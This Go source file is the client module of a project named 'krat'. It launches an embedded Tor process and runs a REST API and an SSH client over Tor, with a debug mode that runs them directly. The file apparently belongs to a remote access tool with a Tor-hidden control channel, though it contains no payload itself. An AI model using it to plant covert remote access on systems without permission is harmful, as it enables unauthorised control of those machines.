package client

import (
	bine "github.com/cretz/bine/tor"
	"github.com/humbertovnavarro/krat/pkg/config"
	"github.com/humbertovnavarro/krat/pkg/restapi"
	"github.com/humbertovnavarro/krat/pkg/sshclient"
	"github.com/humbertovnavarro/krat/pkg/tor"
	"github.com/ipsn/go-libtor"
	"github.com/sirupsen/logrus"
)

var torStartConf = &bine.StartConf{
	ProcessCreator: libtor.Creator,
	DebugWriter:    logrus.New().Writer(),
	DataDir:        config.FilePath("tor"),
}

// start the services without wrapping them through tor
func StartDebug() error {
	eCh := make(chan error)
	go restapi.StartDebug(eCh)
	go sshclient.StartDebug(eCh)
	err := <-eCh
	return err
}

func Start() error {
	config := &tor.TorEngineConf{
		Start: torStartConf,
	}
	torEngine := tor.New(config, OnTorConnect)
	err := torEngine.Start()
	if err != nil {
		panic(err)
	}
	return nil
}

func OnTorConnect(e *tor.TorEngine) {
	defer e.Tor.Close()
	eCh := make(chan error)
	go restapi.Start(e, eCh)
	go sshclient.Start(e, eCh)
	err := <-eCh
	if err != nil {
		logrus.Error(err)
	}
}
